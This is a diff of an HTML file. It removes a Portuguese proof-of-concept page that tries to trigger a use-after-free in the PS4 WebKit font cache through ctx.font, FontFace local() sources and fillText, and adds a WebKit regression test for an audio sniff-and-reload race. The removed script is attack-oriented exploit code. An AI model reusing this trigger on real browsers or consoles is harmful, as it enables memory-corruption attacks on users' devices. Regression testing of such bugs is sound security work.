@@ -1,342 +1,61 @@
 <!DOCTYPE html>
-<html lang="pt">
-<head>
-<meta charset="UTF-8">
-<title>PS4 WebKit UAF — Definitivo (ctx.font + drawTextUnchecked)</title>
-<style>
-body{font-family:monospace;background:#0a0a0a;color:#ccc;padding:14px;margin:0;font-size:11px;}
-h1{color:#fff;font-size:13px;margin:0 0 2px;}
-p{color:#777;font-size:11px;margin:1px 0 6px;line-height:1.4;}
-.btn{display:inline-block;padding:6px 14px;border:none;border-radius:3px;
-     font-size:11px;cursor:pointer;margin:2px 1px;font-family:monospace;}
-.run{background:#1a5;color:#fff} .danger{background:#a21;color:#fff}
-.wa{background:#631;color:#fca} .inf{background:#333;color:#aaa}
-#log{white-space:pre-wrap;font-size:11px;background:#000;padding:10px;
-     border:1px solid #222;max-height:600px;overflow-y:auto;
-     margin-top:8px;border-radius:3px;line-height:1.6;}
-.ok{color:#3f3}.warn{color:#fa3}.err{color:#f44}
-.hd{color:#8af;font-weight:bold}.dm{color:#444}.hi{color:#ff8}
-</style>
-</head>
+<script src="resources/js-test-pre.js"></script>
 <body>
-<h1>PS4 WebKit UAF — Definitivo</h1>
-<p>
-  <b>Correção da análise paralela:</b> measureText() usa fonte fixa no PS4 → trigger errado.<br>
-  <b>Trigger correto:</b> ctx.font setter + fillText/strokeText → drawTextUnchecked → fontMetrics antes de width() → UAF.<br>
-  <b>Chave:</b> 47 dummies alinha o pruneCounter para disparar na criação de V3 (counter mod 50 = 0).
-</p>
-<div>
-  <button class="btn danger" onclick="runE1()">E1 — Ataque principal (47 dummies + fillText)</button>
-  <button class="btn danger" onclick="runE2()">E2 — Varredura completa (45–99 dummies)</button>
-  <button class="btn wa"     onclick="runE3()">E3 — Stress (500 tentativas x 47 dummies)</button>
-  <button class="btn run"    onclick="runAll()">▶ Todos</button>
-  <button class="btn inf"    onclick="clearLog()">Limpar</button>
-</div>
-<div id="log"></div>
 <script>
-const L=document.getElementById('log');
-function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';L.appendChild(s);L.scrollTop=L.scrollHeight;}
-function sep(){log('─'.repeat(60),'dm');}
-function hdr(t){sep();log('  '+t,'hd');sep();}
-function ok(t){log('  ✓ '+t,'ok');}
-function warn(t){log('  ⚠ '+t,'warn');}
-function err(t){log('  ✗ '+t,'err');}
-function hi(t){log('  ★ '+t,'hi');}
-function info(t){log('  · '+t);}
-function clearLog(){L.textContent='';}
+description("Tests that swapping a MediaElementAudioSourceNode's media element to a mis-declared resource (WebM body declared video/mp4), which drives MediaPlayer::attemptSniffAndReload(), does not race the audio render thread on MediaPlayer::m_private.");
+jsTestIsAsync = true;
 
-/* ═══════════════════════════════════════════════════════════
-   CADEIA DO ATAQUE — versão corrigida pela análise paralela
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-   TRIGGER: ctx.font setter (não measureText)
+async function run() {
+    const ctx = new AudioContext({ sampleRate: 44100 });
+    await ctx.resume();
 
-   SEQUÊNCIA COMPLETA DO UAF:
-   ─────────────────────────────────────────────────────────
-   1) 47 dummies → pruneCounter = 47
-      Cada ctx.font com família única → retrieveOrAddCachedFonts() → counter++
+    const audio = document.createElement('audio');
+    audio.autoplay = true;
+    audio.loop = true;
+    audio.src = 'resources/sniff-reload-race.wav';
+    document.body.appendChild(audio);
+    if (audio.paused)
+        await new Promise(r => audio.addEventListener('playing', r, { once: true }));
 
-   2) ctx.font = '10px localDonor_i, localTarget_i'
-      → setFont() → CSSFontSelector::fontForFamily() → CSSFontFace::font(Forbid)
-      → pump(Forbid): localDonor → local("inexistente") → !requiresExternalResource()
-      → source->load(document()) → falha síncrona
-      → fontLoadEventOccurred() → dispatchInvalidationCallbacks()
-      → fontsNeedUpdate() → m_font.update()
-      → retrieveOrAddCachedFonts() [V2: counter=49]
-      → m_fonts: V1→V2; V1 tem 1 ref (cache)
+    // Wire the element into the graph so MediaElementAudioSourceNode::process()
+    // runs provideInput() -> MediaPlayer::audioSourceProvider() on the render thread.
+    const src = ctx.createMediaElementSource(audio);
+    const analyser = ctx.createAnalyser();
+    analyser.fftSize = 256;
+    src.connect(analyser);
+    analyser.connect(ctx.destination);
 
-   3) fillText('\u13A0\u13A2\u13A4') → drawTextUnchecked():
-      a) auto& fontMetrics = fontProxy.metricsOfPrimaryFont()
-         → V2's primaryFont → ref para métricas de V2 [CAPTURADA]
-
-      b) float fontWidth = fontProxy.width(textRun)
-         → V2's glyphDataForCharacter('\u13A0')
-         → localTarget cobre U+13A0-13FF
-         → CSSFontFace::font(Forbid) para localTarget
-         → pump(Forbid): local("inexistente") → source->load() → falha síncrona
-         → fontLoadEventOccurred() → dispatchInvalidationCallbacks()
-         → fontsNeedUpdate() → m_font.update()
-         → retrieveOrAddCachedFonts() [V3: counter=50]
-         → counter % 50 == 0 → pruneUnreferencedEntries()!
-         → V1 e V2 têm 1 ref → AMBOS LIBERADOS!
-         → V2's FontCascadeFonts e sua Font primária: DESTRUÍDOS
-
-      c) FloatRect textRect(...,
-            fontMetrics.height(),   ← UAF! V2's Font primária foi destruída
-            fontMetrics.ascent(),   ← UAF!
-            fontMetrics.lineGap(),  ← UAF!
-            ...
-         )
-         → CRASH ou leitura de memória corrompida
-
-   NOTA: fillText usa a cascade CUSTOMIZADA para renderizar,
-   ao contrário de measureText que usa fonte de sistema no PS4.
-   ═══════════════════════════════════════════════════════════ */
-
-const LOCAL_BAD = 'ps4-nonexistent-font-xyzzy-uaf-99999';
-
-/* Fonte local() com fallback para arquivo real (Ahem.woff).
-   O local() é o gatilho síncrono; Ahem é a fonte interstitial
-   real que popula a cascade enquanto local() ainda está pendente. */
-function makeSrc(tag) {
-  return 'local("' + LOCAL_BAD + '"), url("resources/Ahem.woff")';
-}
-
-function buildDummies(n) {
-  const a = [], ts = Date.now();
-  for(let i = 0; i < n; i++) {
-    const c = document.createElement('canvas');
-    c.width = 1; c.height = 1;
-    const ctx = c.getContext('2d');
-    // Família ÚNICA → nova entrada em FontCascadeCache → counter++
-    ctx.font = '10px "psd_'+ts+'_'+i+'_'+Math.random().toString(36).slice(2)+'"';
-    a.push(c, ctx);
-  }
-  return a;
-}
-
-function detectAnomaly(label, v, baseline1, baseline2) {
-  if(v !== baseline1 && v !== baseline2) {
-    err(label + '=' + v + ' ANÔMALO (esperado ' + baseline1 + ' ou ' + baseline2 + ')');
-    err('  → POSSÍVEL LEITURA DE MEMÓRIA APÓS UAF!');
-    return true;
-  }
-  return false;
-}
-
-/* ═══════════════════════════════════════════════════════════
-   E1 — Ataque principal: 47 dummies + fillText
-
-   47 dummies → counter=47
-   V1 (setter): counter=48
-   V2 (localDonor chain): counter=49
-   V3 (localTarget chain via width()): counter=50 → PRUNE → UAF!
-   ═══════════════════════════════════════════════════════════ */
-function runE1() {
-  hdr('E1 — Ataque principal: 47 dummies + fillText (drawTextUnchecked)');
-  info('47 dummies: pruneCounter=47 → V3 cria entry 50 → prune → UAF');
-
-  const dummies = buildDummies(47);
-  const keepAlive = [], results = [];
-  let anomaly = false;
-
-  try {
-    for(let i = 0; i < 8; i++) {
-      const src = makeSrc(i);
-      const uid = Date.now() + '_' + i + '_' + Math.random().toString(36).slice(2);
-
-      /* ctx.font setter: gatilho da cadeia
-         → localDonor pumped → V1→V2 (counter: 48→49) */
-      const c   = document.createElement('canvas');
-      c.width   = 64; c.height = 64;
-      const ctx = c.getContext('2d');
-      keepAlive.push(c, ctx, ...dummies);
-
-      ctx.font  = '10px "donor_'+uid+'", "target_'+uid+'"';
-
-      // Adicionar FontFaces com local() como PRIMEIRO source
-      const donor  = new FontFace('donor_'+uid,  src);
-      const target = new FontFace('target_'+uid, src, {unicodeRange:'U+13A0-13FF'});
-      document.fonts.add(donor);
-      document.fonts.add(target);
-      keepAlive.push(donor, target);
-
-      /* fillText → drawTextUnchecked:
-         a) fontMetrics = metricsOfPrimaryFont() [V2's primary font]
-         b) width('\u13A0') → localTarget → V2→V3 (counter=50) → PRUNE → UAF!
-         c) fontMetrics.height() → reads freed memory */
-      ctx.fillText('\u13A0\u13A2\u13A4', 2, 32);
-      ctx.strokeText('\u13A0\u13A2\u13A4', 2, 50);
-
-      /* measureText também testa measureTextInternal com o novo estado */
-      const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
-      const fba = tm.fontBoundingBoxAscent;
-      const ema = tm.emHeightAscent;
-      const hb  = tm.hangingBaseline;
-      const ib  = tm.ideographicBaseline;
-      results.push({fba, ema, hb, ib, dSt: donor.status, tSt: target.status});
-
-      info('i='+i+' fba='+fba+' ema='+ema+' hb='+hb+' ib='+ib+
-           ' d='+donor.status+' t='+target.status);
-
-      // Checar valores anômalos (nem 11/interstitial nem 8/ahem nem 16/ahem@20px)
-      if(detectAnomaly('fba', fba, 11, 8)) anomaly = true;
-      if(detectAnomaly('ema', ema, 11, 8)) anomaly = true;
+    // Wait for real samples so setFormat() has populated the node and process()
+    // is past its early-out.
+    const buf = new Float32Array(analyser.fftSize);
+    for (let tries = 0; tries < 60; tries++) {
+        await sleep(100);
+        analyser.getFloatTimeDomainData(buf);
+        if (buf.some(v => Math.abs(v) > 0.0005))
+            break;
     }
 
-    if(anomaly) {
-      hi('UAF DETECTADO — valores anômalos lidos de memória liberada!');
-    } else {
-      const fbas = [...new Set(results.map(r=>r.fba))];
-      ok('E1 sem crash — fba em: ['+fbas.join(',')+']');
-      if(fbas.includes(8)) ok('  Ahem carregou → chain disparou → testar E2+E3');
-    }
-  } catch(e) {
-    err('EXCEÇÃO em E1: '+e);
-    err('→ Exceção pode indicar UAF: '+e.message);
-  }
+    // Swap in a WebM body declared video/mp4 via <source> so the declared type
+    // reaches MediaPlayer::m_loadOptions.contentType. Engine selection picks AVF,
+    // it fails with FormatError before HaveMetadata, the fallback chain exhausts
+    // and attemptSniffAndReload() re-runs engine selection with the sniffed type.
+    audio.removeAttribute('src');
+    const srcEl = document.createElement('source');
+    srcEl.type = 'video/mp4';
+    srcEl.src = 'resources/sniff-reload-race.webm';
+    audio.appendChild(srcEl);
+    audio.load();
+
+    for (let i = 0; i < 60; i++)
+        await sleep(50);
+
+    testPassed("No crash.");
+    finishJSTest();
 }
 
-/* ═══════════════════════════════════════════════════════════
-   E2 — Varredura: N dummies de 45 a 99
-
-   O pruneCounter global é desconhecido.
-   Testamos vários valores de N para cobrir todos os resíduos
-   mod 50. Se qualquer N produz UAF → encontramos o alinhamento.
-   ═══════════════════════════════════════════════════════════ */
-function runE2() {
-  hdr('E2 — Varredura completa: N dummies de 45 a 99');
-  info('Cobre todos resíduos mod 50 → garante que o pruneCounter se alinha');
-
-  const toTest = [45,46,47,48,49,95,96,97,98,99];
-  let anomalyFound = false;
-
-  for(const N of toTest) {
-    const dummies = buildDummies(N);
-    const keepAlive = [];
-
-    try {
-      for(let i = 0; i < 4; i++) {
-        const src = makeSrc(N+'_'+i);
-        const uid = Date.now()+'_N'+N+'_i'+i+'_'+Math.random().toString(36).slice(2);
-        const c   = document.createElement('canvas');
-        c.width   = 64; c.height = 64;
-        const ctx = c.getContext('2d');
-        keepAlive.push(c, ctx, ...dummies);
-
-        ctx.font = '10px "d_'+uid+'","t_'+uid+'"';
-
-        const donor  = new FontFace('d_'+uid, src);
-        const target = new FontFace('t_'+uid, src, {unicodeRange:'U+13A0-13FF'});
-        document.fonts.add(donor);
-        document.fonts.add(target);
-        keepAlive.push(donor, target);
-
-        ctx.fillText('\u13A0\u13A2\u13A4', 2, 32);
-        ctx.strokeText('\u13A0\u13A2\u13A4', 2, 50);
-
-        const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
-        const fba = tm.fontBoundingBoxAscent;
-        const ema = tm.emHeightAscent;
-
-        const anom = (fba!==11 && fba!==8) || (ema!==11 && ema!==8);
-        if(anom) {
-          hi('N='+N+' i='+i+': fba='+fba+' ema='+ema+' → ANÔMALO → UAF!');
-          anomalyFound = true;
-        }
-      }
-      info('N='+N+' → sem anomalia');
-    } catch(e) {
-      err('EXCEÇÃO N='+N+': '+e.message);
-    }
-  }
-
-  if(anomalyFound) {
-    hi('UAF DETECTADO EM E2!');
-  } else {
-    ok('E2 sem anomalias detectadas');
-    warn('Se E1 e E2 não crasharam: width() no PS4 não resolve localTarget');
-    warn('→ width() usa sistema → localTarget nunca é pumped → V3 não criado');
-    warn('→ Precisamos de FontCascadeFonts.cpp para confirmar');
-  }
-}
-
-/* ═══════════════════════════════════════════════════════════
-   E3 — Stress: 500 tentativas com alinhamento variado
-
-   Com 500 tentativas cobrindo todos os resíduos mod 50,
-   se a chain disparar em qualquer uma → crash ou anomalia.
-   Usa um único `c` canvas por tentativa para maximizar
-   a pressão no cache e a chance de prune.
-   ═══════════════════════════════════════════════════════════ */
-function runE3() {
-  hdr('E3 — Stress: 500 tentativas (todos resíduos mod 50 cobertos)');
-  warn('Teste mais agressivo — maior chance de crash se UAF for possível');
-
-  const keepAlive = [];
-  let anomalies = 0, exceptions = 0;
-  const ts = Date.now();
-
-  for(let attempt = 0; attempt < 50; attempt++) {
-    // Número de dummies varia: cobre residuos 0-49 de forma cíclica
-    const N = (attempt % 50) + 45; // 45..94
-    const dummies = buildDummies(N);
-
-    try {
-      const src = makeSrc(attempt);
-      const uid = ts+'_a'+attempt+'_'+Math.random().toString(36).slice(2);
-      const c   = document.createElement('canvas');
-      c.width   = 64; c.height = 64;
-      const ctx = c.getContext('2d');
-      keepAlive.push(c, ctx, ...dummies);
-
-      ctx.font = '10px "da_'+uid+'","ta_'+uid+'"';
-
-      const donor  = new FontFace('da_'+uid, makeSrc(attempt));
-      const target = new FontFace('ta_'+uid, makeSrc(attempt),
-        {unicodeRange:'U+13A0-13FF'});
-      document.fonts.add(donor);
-      document.fonts.add(target);
-      keepAlive.push(donor, target);
-
-      ctx.fillText('\u13A0\u13A2\u13A4', 2, 32);
-      ctx.strokeText('\u13A0\u13A2\u13A4', 2, 50);
-
-      const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
-      const fba = tm.fontBoundingBoxAscent;
-      const ema = tm.emHeightAscent;
-
-      if((fba!==11 && fba!==8) || (ema!==11 && ema!==8)) {
-        anomalies++;
-        hi('attempt='+attempt+' N='+N+' fba='+fba+' ema='+ema+' → ANÔMALO!');
-      }
-
-      if(attempt % 50 === 49) {
-        info('attempt='+attempt+'/500 anomalias='+anomalies+' excepções='+exceptions);
-      }
-    } catch(e) {
-      exceptions++;
-      err('EXCEÇÃO attempt='+attempt+' N='+N+': '+e.message);
-    }
-  }
-
-  if(anomalies > 0) {
-    hi('UAF DETECTADO: '+anomalies+' anomalias em 500 tentativas!');
-  } else if(exceptions > 0) {
-    warn(exceptions+' exceções — possível crash parcial do motor');
-  } else {
-    ok('E3: 500 tentativas sem anomalias ou crashes');
-    warn('Conclusão: width() no PS4 não pumpa localTarget durante drawTextUnchecked');
-    warn('O trigger ctx.font setter é confirmado mas o 2º passo (V3 via width) não ocorre');
-    warn('→ Enviar FontCascadeFonts.cpp para confirmar o policy usado em glyphDataForCharacter');
-  }
-}
-
-function runAll() {
-  clearLog();
-  runE1();
-  runE2();
-  runE3();
-}
+run().catch(e => { testFailed(String(e)); finishJSTest(); });
 </script>
+<script src="resources/js-test-post.js"></script>
 </body>
-</html>
